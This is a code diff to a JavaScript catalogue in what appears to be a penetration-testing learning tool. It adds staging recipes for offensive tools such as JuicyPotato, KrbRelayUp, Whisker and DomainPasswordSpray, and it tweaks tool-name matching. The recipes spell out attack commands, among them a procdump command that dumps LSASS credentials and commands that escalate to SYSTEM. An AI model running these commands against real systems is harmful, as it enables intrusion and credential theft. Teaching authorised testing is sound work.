@@ -1,5 +1,5 @@
 /*!
- * obol data — tool-staging.js — OBOL.TOOL_STAGING, OBOL.stagingFor(), OBOL.renderToolStaging()
+ * obol data - tool-staging.js - OBOL.TOOL_STAGING, OBOL.stagingFor(), OBOL.renderToolStaging()
  *
  * The gap this fills: many on-host commands assume the tool is ALREADY on the target and loaded
  * (`. .\PowerView.ps1; Get-DomainGroup ...`, `winPEASx64.exe`, `./linpeas.sh`). No command tells a learner
@@ -28,6 +28,8 @@
       mode: 'ps-iex', load: 'Invoke-AllChecks is now available', why: 'PowerUp is a PowerShell script; load it, then run Invoke-AllChecks.' },
     privesccheck: { name: 'PrivescCheck', os: 'windows', file: 'PrivescCheck.ps1', where: 'your PrivescCheck clone',
       mode: 'ps-iex', load: 'Invoke-PrivescCheck is now available', why: 'PrivescCheck is a PowerShell script; load it, then run Invoke-PrivescCheck.' },
+    domainpasswordspray: { name: 'DomainPasswordSpray', os: 'windows', file: 'DomainPasswordSpray.ps1', where: '~/.obol/arsenal/win',
+      mode: 'ps-iex', load: 'Invoke-DomainPasswordSpray is now available', why: 'DomainPasswordSpray is a PowerShell script; load it into your session before running Invoke-DomainPasswordSpray.' },
     // ---- Windows binaries (download to disk, run) ----
     sharphound: { name: 'SharpHound', os: 'windows', file: 'SharpHound.exe', where: 'your BloodHound collectors dir',
       mode: 'exe', run: 'SharpHound.exe -c All', why: 'The collector has to run on (or from) a domain-joined host to query AD and zip the results.' },
@@ -47,9 +49,27 @@
       why: 'The potato abuses SeImpersonate in the service context on the target.' },
     printspoofer: { name: 'PrintSpoofer', os: 'windows', file: 'PrintSpoofer64.exe', where: 'your PrintSpoofer release', mode: 'exe', run: 'PrintSpoofer64.exe -i -c cmd',
       why: 'PrintSpoofer abuses SeImpersonate via the print spooler on the target.' },
+    juicypotato: { name: 'JuicyPotato', os: 'windows', file: 'JuicyPotato.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami" -t *',
+      why: 'JuicyPotato abuses SeImpersonate via DCOM/CLSID on legacy Windows (Server 2016 / Win10 < 1809).' },
+    juicypotatong: { name: 'JuicyPotatoNG', os: 'windows', file: 'JuicyPotatoNG.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+      why: 'JuicyPotatoNG abuses SeImpersonate on modern Windows.' },
+    sharpwsus: { name: 'SharpWSUS', os: 'windows', file: 'SharpWSUS.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'SharpWSUS.exe locate',
+      why: 'SharpWSUS enumerates and abuses local WSUS servers from a Windows foothold.' },
+    sharpsccm: { name: 'SharpSCCM', os: 'windows', file: 'SharpSCCM.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'SharpSCCM.exe local site-info',
+      why: 'SharpSCCM queries SCCM/MECM configuration and secrets from a domain foothold.' },
+    whisker: { name: 'Whisker', os: 'windows', file: 'Whisker.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'Whisker.exe add /target:<samAccountName>',
+      why: 'Whisker writes msDS-KeyCredentialLink (Shadow Credentials) from a Windows foothold.' },
+    krbrelayup: { name: 'KrbRelayUp', os: 'windows', file: 'KrbRelayUp.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'KrbRelayUp.exe relay -d <domain> -f -m shadowcred',
+      why: 'KrbRelayUp relays Kerberos authentication locally to escalate to SYSTEM.' },
+    procdump: { name: 'ProcDump', os: 'windows', file: 'procdump64.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp',
+      why: 'ProcDump is a signed Sysinternals binary used to create an LSASS minidump for offline parsing with pypykatz.' },
+    watson: { name: 'Watson', os: 'windows', file: 'Watson.exe', where: '~/.obol/arsenal/win', mode: 'exe', run: 'Watson.exe',
+      why: 'Watson enumerates missing Windows hotfixes on the target.' },
     // ---- Linux scripts / binaries ----
     linpeas: { name: 'linPEAS', os: 'linux', file: 'linpeas.sh', where: '/usr/share/peass/linpeas', mode: 'sh', run: './linpeas.sh | tee linpeas.out',
       why: 'linPEAS sweeps the host for privesc leads, so it runs on the target.' },
+    linenum: { name: 'LinEnum', os: 'linux', file: 'LinEnum.sh', where: '~/.obol/arsenal/lin', mode: 'sh', run: './LinEnum.sh -t',
+      why: 'LinEnum enumerates local Linux configuration and privilege-escalation vectors.' },
     pspy: { name: 'pspy', os: 'linux', file: 'pspy64', where: 'your pspy release', mode: 'sh', run: './pspy64',
       why: 'pspy watches processes/cron on the target without root, so it runs there.' },
     'les.sh': { name: 'linux-exploit-suggester', os: 'linux', file: 'les.sh', where: 'your LES clone', mode: 'sh', run: './les.sh',
@@ -59,11 +79,14 @@
   // Match a command's tool (or a close stem) to a staging recipe.
   function stagingFor(tool) {
     if (!tool) return null;
-    var t = String(tool).toLowerCase().replace(/\.(exe|ps1|sh)$/, '').replace(/x64|x86|64/g, '');
+    var raw = String(tool).toLowerCase().replace(/\.(exe|ps1|sh)$/, '');
+    if (T[raw]) return T[raw];
+    var t = raw.replace(/x64|x86|64/g, '');
     if (T[t]) return T[t];
     // a couple of friendly aliases
     var alias = { 'linux-exploit-suggester': 'les.sh', les: 'les.sh', 'invoke-allchecks': 'powerup', 'get-domainuser': 'powerview', 'get-domaingroup': 'powerview', 'find-interestingdomainacl': 'powerview', 'get-domainobjectacl': 'powerview', 'get-domaincomputer': 'powerview' };
     if (alias[t]) return T[alias[t]];
+    if (alias[raw]) return T[alias[raw]];
     return null;
   }
 
